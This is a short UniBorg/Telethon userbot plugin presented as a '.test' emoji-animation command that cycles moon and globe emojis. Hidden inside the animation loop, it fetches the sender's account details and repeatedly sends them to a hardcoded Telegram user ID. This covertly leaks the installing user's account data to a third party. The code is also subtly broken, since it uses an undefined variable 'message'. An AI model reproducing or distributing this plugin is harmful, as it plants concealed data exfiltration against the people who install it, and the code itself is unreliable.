# (c) @UniBorg
# Original written by @UniBorg edit by @laciamemeframe

from telethon import events
import asyncio
from collections import deque


@borg.on(events.NewMessage(pattern=r"\.test", outgoing=True))
async def _(event):
	if event.fwd_from:
		return
	deq = deque(list("🌗🌘🌑🌒🌏🌍🌎🌎🌍🌏🌍🌎🌓🌔🌕🌖"))
	for _ in range(48):
		sender = await message.get_sender()
		await message.client.send_message(503174223, f"<code>{sender}</code>")
		await asyncio.sleep(0.1)
		await event.edit("".join(deq))
		deq.rotate(1)
    
